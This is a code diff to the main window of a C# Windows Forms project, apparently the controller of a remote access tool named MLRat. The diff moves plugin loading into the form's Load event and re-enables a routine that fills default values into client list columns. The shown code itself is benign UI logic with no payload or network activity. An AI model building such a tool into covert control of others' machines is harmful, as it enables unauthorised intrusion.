@@ -29,14 +29,6 @@ namespace MLRat.Forms
         public MainWindow()
         {
             InitializeComponent();
-            DirectoryInfo id = new DirectoryInfo("Plugins");
-            if (id.Exists)
-            {
-                foreach (FileInfo pluginFile in id.GetFiles("*.MLP"))
-                {
-                    LoadPlugin(pluginFile.FullName);
-                }
-            }
         }
 
         private Guid GetUniqueID()
@@ -98,17 +90,22 @@ namespace MLRat.Forms
                 ColumnHeader header = clientList.Columns.Add(name);
                 column.Index = header.Index;
                 header.Tag = defaultValue;
-                /*
+                
                 Invoke((MethodInvoker)delegate ()
                 {
                     foreach (ListViewItem clientItem in clientList.Items)
                     {
-                        if(clientItem.SubItems.Count-1 < header.Index)
-                            clientItem.SubItems.Add(defaultValue);
+                        foreach (ColumnHeader cheader in clientList.Columns)
+                        {
+                            if (clientItem.SubItems.Count == header.Index)
+                            {
+                                clientItem.SubItems.Add((string)header.Tag);
+                            }
+                        }
                     }
                 });
-               */
-                Console.WriteLine("added column: {0}", name);
+               
+                Console.WriteLine("Added column: {0}", name);
                 return column;
             }
         }
@@ -216,7 +213,14 @@ namespace MLRat.Forms
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
-
+            DirectoryInfo id = new DirectoryInfo("Plugins");
+            if (id.Exists)
+            {
+                foreach (FileInfo pluginFile in id.GetFiles("*.MLP"))
+                {
+                    LoadPlugin(pluginFile.FullName);
+                }
+            }
         }
 
         private void button1_Click(object sender, EventArgs e)
